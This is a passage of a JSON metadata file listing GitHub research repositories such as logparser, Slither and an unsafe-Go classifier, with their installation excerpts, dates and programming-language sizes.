                    "value": "Use the following commands to download and unzip the downloaded dataset.\n```\nwget https://zenodo.org/record/7196966/files/dataset.tar.gz\ntar zxvf dataset.tar.gz\n```\nIt will take about 1 min. \n",
                    "original_header": "Dataset"
                },
                "confidence": 0.9999999996491056,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/DeepSoftwareAnalytics/RACE/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-12T12:33:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-19T09:54:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 119818
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 6481
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "757": {
        "filename": "logpai_logparser_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/logpai/logparser",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "\r\nWe recommend installing the logparser package and requirements via pip install.\r\n\r\n```\r\npip install logparser3\r\n```\r\n\r\nIn particular, the package depends on the following requirements. Note that regex matching in Python is brittle, so we recommend fixing the regex library to version 2022.3.2.\r\n\r\n+ python 3.6+\r\n+ regex 2022.3.2\r\n+ numpy\r\n+ pandas\r\n+ scipy\r\n+ scikit-learn\r\n\r\nConditional requirements:\r\n\r\n+ If using MoLFI: `deap`\r\n+ If using SHISO: `nltk`\r\n+ If using SLCT: `gcc`\r\n+ If using LogCluster: `perl`\r\n+ If using NuLog: `torch`, `torchvision`, `keras_preprocessing`\r\n+ If using DivLog: `openai`, `tiktoken` (require python 3.8+)\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Logparser"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/logpai/logparser/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\n<div>\r\n<a href=\"https://pypi.org/project/logparser3\"><img src=\"https://img.shields.io/badge/python-3.6+-blue\" style=\"max-width: 100%;\" alt=\"Python version\"></a>\r\n<a href=\"https://pypi.org/project/logparser3\"><img src=\"https://img.shields.io/pypi/v/logparser3.svg\" style=\"max-width: 100%;\" alt=\"Pypi version\"></a>\r\n<a href=\"https://github.com/logpai/logparser/actions/workflows/ci.yml\"><img src=\"https://github.com/logpai/logparser/workflows/CI/badge.svg?event=push\" style=\"max-width: 100%;\" alt=\"Pypi version\"></a>\r\n<a href=\"https://pepy.tech/project/logparser3\"><img src=\"https://static.pepy.tech/badge/logparser3\" style=\"max-width: 100%;\" alt=\"Downloads\"></a>\r\n<a href=\"https://github.com/logpai/logparser/blob/main/LICENSE.md\"><img src=\"https://img.shields.io/badge/license-view-brightgreen\" style=\"max-width: 100%;\" alt=\"License\"></a>\r\n<a href=\"https://github.com/logpai/logparser#discussion\"><img src=\"https://img.shields.io/badge/chat-wechat-brightgreen?style=flat\" style=\"max-width: 100%;\"></a>\r\n</div>\r\n<hr/>\r\n\r\n<div>\r\n<a href=\"https://github.com/logpai/logparser/stargazers\"><img src=\"http://bytecrank.com/nastyox/reporoster/php/stargazersSVG.php?user=logpai&repo=logparser\" width=\"600\"/><a/>\r\n</div>\r\n\r\nLogparser provides a machine learning toolkit and benchmarks for automated log parsing, which is a crucial step for structured log analytics. By applying logparser, users can automatically extract event templates from unstructured logs and convert raw log messages into a sequence of structured events. The process of log parsing is also known as message template extraction, log key extraction, or log message clustering in the literature.\r\n\r\n<p align=\"center\"><img src=\"https://cdn.jsdelivr.net/gh/logpai/logparser@main/docs/img/example.jpg\" width=\"485\"><br>An example of log parsing</p>\r\n\r \n",
                    "original_header": "Logparser"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/logpai/logparser/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\n+ Since the first release of logparser, many PRs and issues have been submitted due to incompatibility with Python 3. Finally, we update logparser v1.0.0 with support for Python 3. Thanks for all the contributions ([#PR86](https://github.com/logpai/logparser/pull/86), [#PR85](https://github.com/logpai/logparser/pull/85), [#PR83](https://github.com/logpai/logparser/pull/83), [#PR80](https://github.com/logpai/logparser/pull/80), [#PR65](https://github.com/logpai/logparser/pull/65), [#PR57](https://github.com/logpai/logparser/pull/57), [#PR53](https://github.com/logpai/logparser/pull/53), [#PR52](https://github.com/logpai/logparser/pull/52), [#PR51](https://github.com/logpai/logparser/pull/51), [#PR49](https://github.com/logpai/logparser/pull/49), [#PR18](https://github.com/logpai/logparser/pull/18), [#PR22](https://github.com/logpai/logparser/pull/22))!\r\n+ We build the package wheel logparser3 and release it on pypi. Please install via `pip install logparser3`.\r\n+ We refactor the code structure and beautify the code via the Python code formatter black.\r\n\r \n",
                    "original_header": "\ud83c\udf08 New updates"
                },
                "confidence": 0.9999999997429541,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/logpai/logparser/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-08-05T11:32:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T17:29:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 446664
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 67264
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 44628
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1268
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "758": {
        "filename": "klaeufer_issue10709-scala_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/klaeufer/issue10709-scala",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "https://github.com/mockito/mockito/issues/1605\n \n"
                },
                "confidence": 0.9990698525682603,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/klaeufer/issue10709-scala/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-02-05T06:05:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-05-22T00:34:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Scala",
                    "name": "Scala",
                    "type": "Programming_language",
                    "size": 13031
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "759": {
        "filename": "fxpl_notebooks_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/fxpl/notebooks",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "As can be seen, most scripts are written in bash and require bash in order to\nrun. It may be possible to run the Java code in other environments, but it is\nonly tested on Linux. \nNote that some of the scripts are written in R. Accordingly, if you want to\nrun all post processing scripts, R must be installed. \nIf you want to use `NotebookAnalyzer` to list imported modules and frequently\ncalled functions (see below), you also need Python 3, including the modules that\ncan be expected to be commonly used. \n",
                    "original_header": "Execution environment"
                },
                "confidence": 0.9984537656595919,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fxpl/notebooks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To build the Java code, enter the directory `Programs` and type: \nIf you also want to run the tests, instead (or additionally) type: \n",
                    "original_header": "Building and testing the Java code"
                },
                "confidence": 0.9752850572811516,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fxpl/notebooks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Below is a description of how to execute the Java programs. Examples of commands\nfor running each program can be found in the scripts `run_notebookAnalyzer_ccc.sh`,\n`run_notebookAnalyzer_mod.sh`, `run_pythonDumper.sh` and `run_sccOutputAnalyzer.sh`\nrespectively.\n \n",
                    "original_header": "Execution"
                },
                "confidence": 0.9920949659904519,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fxpl/notebooks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "When the notebook analyzer is run, `org.json` must be in the class path. A jar\nfile is provided in `Programs/external`. If you want to use the modules\nfunctionality or function listing, i.e. if you provide any of the arguments\n`--modules` and `functions=<FILE>`, also Programs/python must be in the class\npath. \n",
                    "original_header": "Notebook Analyzer"
                },
                "confidence": 0.9999998097849992,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fxpl/notebooks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "When running the dumper programs, `org.json` must be in the class path. A jar\nfile is provided in `Programs/external`. \n",
                    "original_header": "PythonDumper and PythonZipDumper"
                },
                "confidence": 0.9852581261337454,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fxpl/notebooks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The following scripts are intended to be used for post processing:\n * clone_analysis_nba.sh\n * clone_analysis_scc.sh\n * get_notebook_sizes.sh\n * language_analysis.sh\n * language_inconsistencies.sh\n * list_duplicated_notebooks.sh\n * print_most_common_snippets.sh\n * statistics_ccc_nba.R (with create_sym_links_nba.sh as preprocessing!)\n * statistics_ccc_scc.R (with create_sym_links_scc.sh as preprocessing!)\n * modules_post_processing.sh\n * count_param_usages.sh\n * find_keywords.sh \nAfter having executed the R scripts, you may want to run\n`reduce_large_images.sh`. \n",
                    "original_header": "Scripts"
                },
                "confidence": 0.9984770676459238,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fxpl/notebooks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Before performing the steps listed below, you need to build the Java code, see\ndescription above.\n \n",
                    "original_header": "Repeating our results"
                },
                "confidence": 0.9999862713268823,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fxpl/notebooks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you want to repeat the results of \"Jupyter Notebooks on Github:\nCharacteristics and Code Clones\" by K\u00e4ll\u00e9n, Sigvardsson and Wrigstad\" you need\nto do the following:\n1. Download all notebooks and the notebook-repository mapping file from\n   https://export.uppmax.uu.se/snic2020-6-136/notebooks.zip and unzip the file.\n2. Change the paths in `paths.sh` according to the inline comments.\n3. Execute `run_notebookAnalyzer_ccc.sh`.\n4. Execute `run_pythonDumper.sh`.\n5. Do the clone analysis with SourcererCC\n   (https://github.com/Mondego/SourcererCC) according to their instructions,\n   including concatenation of output files.\n6. Zip `results.pairs` and save the zip file with the name `clone.pairs.zip`.\n   Concatenate the files in the directory `files_stats` into one file named\n   `files.stats`. Place `clone.pairs.zip` and `files.stats` in the directory\n   that you have provided in `paths.sh`.\n7. Execute `run_sccOutputAnalyzer.sh`.\n8. Execute `run_post_processing_ccc.sh`. This must not be done before completion\n   of step 3 and 7. Check `outputNBA` and `outputSOA` for output. \nStep 3 can be done in parallel with steps 4-7.\n \n",
                    "original_header": "Jupyter Notebooks on GitHub: Characteristics and Code Clones"
                },
                "confidence": 0.9890921568749718,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fxpl/notebooks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you want to repeat the results of \"To Err or Not to Err?\" by K\u00e4ll\u00e9n and\nWrigstad, you need to do the following:\n 1. Download all notebooks from\n    https://export.uppmax.uu.se/snic2020-6-136/notebooks.zip and unzip the file.\n 2. Download https://export.uppmax.uu.se/snic2020-6-136/notebook_clones.csv and\n    remove all notebooks listed in this file from the dataset, or move them to a\n    separate directory.\n 3. Update `nbPath` and `outputNBA` in `paths.sh` according to the instructions\n    in the file.\n 4. Make sure that all Python modules that are expected to be frequently\n    imported in the courpus are installed on your system. See the paper for a\n    list of the ten most frequently imported modules.\n 5. Execute `run_notebookAnalyzer_mod.sh`: `./run_notebookAnalyzer_mod.sh`. \n    If you get many output lines saying: \"Module `<name>` is not available. Some\n    function calls for this module will not be identified.\" for certain values\n    of `<name>`, you might want to interrupt the execution and install these\n    Python modules.\n 6. Create a symbolic link to your output directory (`outputNBA` in `paths.sh`)\n    The link must be named `Output` and placed in the same directory as the\n    directory `Scripts` (i.e. the root directory of this repository):\n    `ln -s <path-to-your-output-directory> Output`.\n 7. Enter the scripts directory and execute `modules_post_processing.sh`:\n    `cd Scripts`\n    `./modules_post_processing.sh`\n 8. If you also want to list the keywords used as module names (see Appendix C),\n    execute `find_keywords.sh`: `./find_keywords.sh`.\n 9. Step back to the root directory of the repository: `cd ..`.\n10. In `run_notebookAnalyzer_mod.sh`, replace `--modules` with\n    `--functions=$outputDir/functions_to_list.csv`.\n11. Execute `run_notebookAnalyzer_mod.sh` again.\n12. For each file $f named `<module>.<function>-calls<timestamp>.csv`, run:\n    `python3 Programs/python/risky_comb_finder.py Output/$f Output`.\n13. Remove the symbolic link created in step 4: `rm Output`. \nIf the files $f list calls to `numpy.array`, `pandas.read_csv`,\n`pandas.DataFrame`, `matplotlib.pyplot.plot`, `matplotlib.pyplot.show`,\n`numpy.arange` and `numpy.zeros`, `risky_comb_finder.py` (step 12) will identify\ncalls with smelly argument combinations in the lists of calls to the functions.\nRisky parameter combinations are not identified, and `risky_comb_finder.py`\nwill not identify any smelly argument combinations, for other functions. \n",
                    "original_header": "To Err or Not to Err?"
                },
                "confidence": 0.9986171022279114,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fxpl/notebooks/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-09-05T13:17:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-16T03:31:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 354591
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 71672
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 36661
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 28246
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 13191
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "760": {
        "filename": "vardhah_epsilon_weighted_Hybrid_Query_Strategy_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/vardhah/Batch-mode-DeepAL-for-regression",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-09-17T22:08:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-14T11:22:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 13942132
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 239391
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 12345
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "761": {
        "filename": "stg-tud_ungoml_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/stg-tud/ungoml",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Execute the following command to build the image:\n\n`sudo docker build . -t unsafe-go-toolkit`\n",
                    "type": "Text_excerpt",
                    "original_header": "Building the Image",
                    "parent_header": [
                        "\ud83d\udcd6 Overview",
                        "Installation (Docker)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stg-tud/ungoml/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This toolkit should provide a wrapper / Docker container for\n<https://github.com/Cortys/unsafe-go-classifier>. Snippets of Go code should be given as a parameter for a container. The container will then analyze the code for unsafe usages and try to classify it. \n",
                    "original_header": "Unsafe Toolkit"
                },
                "confidence": 0.9166372301935394,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/stg-tud/ungoml/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`./evaluate.py -p https://github.com/jlauinger/go-safer.git` \n",
                    "original_header": "Arguments for the Evaluation"
                },
                "confidence": 0.9999124616860307,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/stg-tud/ungoml/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This project can be tested using the tests.py file and the following command: \nYou can also run the tests in Visual Studio Code, the test settings have been preconfigured. \n",
                    "original_header": "Testing"
                },
                "confidence": 0.9807129149596783,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/stg-tud/ungoml/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-10-29T13:17:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-03T03:49:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 24447
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 683
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 227
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "762": {
        "filename": "crytic_slither_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/crytic/slither",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "> **Note** <br />\n> Slither requires Python 3.8+.\nIf you're **not** going to use one of the [supported compilation frameworks](https://github.com/crytic/crytic-compile), you need [solc](https://github.com/ethereum/solidity/), the Solidity compiler; we recommend using [solc-select](https://github.com/crytic/solc-select) to conveniently switch between solc versions.\n",
                    "type": "Text_excerpt",
                    "original_header": "How to install",
                    "parent_header": [
                        "<a href=\"https://crytic.github.io/slither/slither.html\">Slither, the smart contract static analyzer</a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/crytic/slither/master/README.md"
            },
            {
                "result": {
                    "value": "```console\npython3 -m pip install slither-analyzer\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Using Pip",
                    "parent_header": [
                        "<a href=\"https://crytic.github.io/slither/slither.html\">Slither, the smart contract static analyzer</a>",
                        "How to install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/crytic/slither/master/README.md"
            },
            {
                "result": {
                    "value": "```bash\ngit clone https://github.com/crytic/slither.git && cd slither\npython3 -m pip install .\n```\n\nWe recommend using a Python virtual environment, as detailed in the [Developer Installation Instructions](https://github.com/trailofbits/slither/wiki/Developer-installation), if you prefer to install Slither via git.\n",
                    "type": "Text_excerpt",
                    "original_header": "Using Git",
                    "parent_header": [
                        "<a href=\"https://crytic.github.io/slither/slither.html\">Slither, the smart contract static analyzer</a>",
                        "How to install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/crytic/slither/master/README.md"
            },
            {
                "result": {
                    "value": "Use the [`eth-security-toolbox`](https://github.com/trailofbits/eth-security-toolbox/) docker image. It includes all of our security tools and every major version of Solidity in a single image. `/home/share` will be mounted to `/share` in the container.\n\n```bash\ndocker pull trailofbits/eth-security-toolbox\n```\n\nTo share a directory in the container:\n\n```bash\ndocker run -it -v /home/share:/share trailofbits/eth-security-toolbox\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Using Docker",
                    "parent_header": [
                        "<a href=\"https://crytic.github.io/slither/slither.html\">Slither, the smart contract static analyzer</a>",
                        "How to install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/crytic/slither/master/README.md"
            },
            {
                "result": {
                    "value": "* For GitHub action integration, use [slither-action](https://github.com/marketplace/actions/slither-action).\n* For pre-commit integration, use (replace `$GIT_TAG` with real tag)\n  ```YAML\n  - repo: https://github.com/crytic/slither\n    rev: $GIT_TAG\n    hooks:\n      - id: slither\n  ```\n* To generate a Markdown report, use `slither [target] --checklist`.\n* To generate a Markdown with GitHub source code highlighting, use `slither [target] --checklist --markdown-root https://github.com/ORG/REPO/blob/COMMIT/` (replace `ORG`, `REPO`, `COMMIT`)\n",
                    "type": "Text_excerpt",
                    "original_header": "Integration",
                    "parent_header": [
                        "<a href=\"https://crytic.github.io/slither/slither.html\">Slither, the smart contract static analyzer</a>",
                        "How to install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/crytic/slither/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\"https://raw.githubusercontent.com/crytic/slither/master/logo.png\" alt=\"Slither Static Analysis Framework Logo\" width=\"500\" /> \n",
                    "original_header": "<a href=\"https://crytic.github.io/slither/slither.html\">Slither, the smart contract static analyzer</a>"
                },
                "confidence": 0.9939689022443262,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/crytic/slither/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[Contact us](https://www.trailofbits.com/contact/) to get help on building custom tools.\n \n",
                    "original_header": "Tools"
                },
                "confidence": 0.9078488491540967,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/crytic/slither/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-09-05T21:56:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T06:43:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2756796
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 742589
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16690
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vyper",
                    "name": "Vyper",
                    "type": "Programming_language",
                    "size": 6908
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2108
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1592
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "763": {
        "filename": "M3SOulu_NLoN_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/M3SOulu/NLoN",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "\n\n\n\nWith devtools:\n\n    devtools::install_github(\"M3SOulu/NLoN\")\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "NLoN - Natural Language or Not"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/M3SOulu/NLoN/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-03-05T15:31:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-02-17T01:10:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 25029
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "764": {
        "filename": "StatisKit_AutoWIG_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/StatisKit/AutoWIG",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2015-01-16T14:14:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-21T11:06:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 337632
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 7100
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 3937
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "765": {
        "filename": "felicitia_HiPHarness_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/felicitia/HiPHarness",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-08-07T00:15:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-11-23T21:38:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 68728
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 62166
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "766": {
        "filename": "rodrigo-brito_refactoring-aware-diff_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rodrigo-brito/refactoring-aware-diff",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
